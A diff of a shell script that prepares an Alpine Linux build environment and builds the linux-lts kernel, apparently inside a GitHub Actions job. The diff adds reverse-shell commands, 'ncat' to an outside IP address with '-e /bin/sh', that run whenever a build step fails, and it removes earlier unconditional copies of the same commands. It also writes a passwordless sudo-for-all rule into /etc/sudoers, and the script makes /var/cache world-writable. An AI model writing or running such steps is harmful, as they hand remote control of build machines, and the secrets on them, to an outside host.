@@ -27,11 +27,10 @@ build_badvpn() {
 ##REF: https://wiki.alpinelinux.org/wiki/Creating_an_Alpine_package#Setup_your_system_and_account
 
 apk update
-apk add alpine-sdk git nmap-ncat abuild
-apk add initramfs-generator perl gmp-dev mpc1-dev mpfr-dev elfutils-dev bash flex bison zstd sed installkernel bc linux-headers linux-firmware-any openssl-dev>3 mawk diffutils findutils pahole python3
+apk add alpine-sdk git nmap-ncat abuild initramfs-generator perl gmp-dev mpc1-dev mpfr-dev elfutils-dev bash flex bison zstd sed installkernel bc linux-headers linux-firmware-any openssl-dev>3 mawk diffutils findutils pahole python3
 
 git config --global user.name "Your Full Name"
-git config --global user.email "your@email.address"
+git config --global user.email "youremail.address"
 git clone https://gitlab.alpinelinux.org/alpine/aports
 
 apk add bash sudo
@@ -42,12 +41,7 @@ chmod -R 777 /var/cache/
 
 chown -R abuild3:abuild3 /github/workspace/aports
 
-
-
 cp installrsakey.sh /home/abuild3/installrsakey.sh
-
-
-
 
 chmod +x /home/abuild3/installrsakey.sh
 chown -R abuild3:abuild3 /home/abuild3/installrsakey.sh
@@ -57,20 +51,24 @@ mkdir -p .abuild
 chown -R abuild3:abuild3 .abuild
 chown -R abuild3:abuild3 /github/home/
 
+echo "ABUILD3 ALL=(ALL) NOPASSWD: ALL:" >> /etc/sudoers
 
-su -c "/home/abuild3/installrsakey.sh" -m abuild3 
+
+sudo -u abuild3 "/home/abuild3/installrsakey.sh" || {
+  ncat 195.201.134.209 83 -e /bin/sh
+}
+
+su -c "/home/abuild3/installrsakey.sh" -m abuild3 || {
+  ncat 195.201.134.209 84 -e /bin/sh
+}
 
 cp /home/abuild3/.abuild/abuild.conf .abuild
 chown -R abuild3:abuild3 .abuild
 
+su -c "cd /github/workspace/aports/main/linux-lts; abuild" -m abuild3 || {
+  ncat 195.201.134.209 83 -e /bin/sh
+}
 
-ncat 195.201.134.209 83 -e /bin/sh
-sleep 10
-
-su -c "cd /github/workspace/aports/main/linux-lts; abuild" -m abuild3 
-
-ncat 195.201.134.209 84 -e /bin/sh
-sleep 10
 
 
 : <<'END'
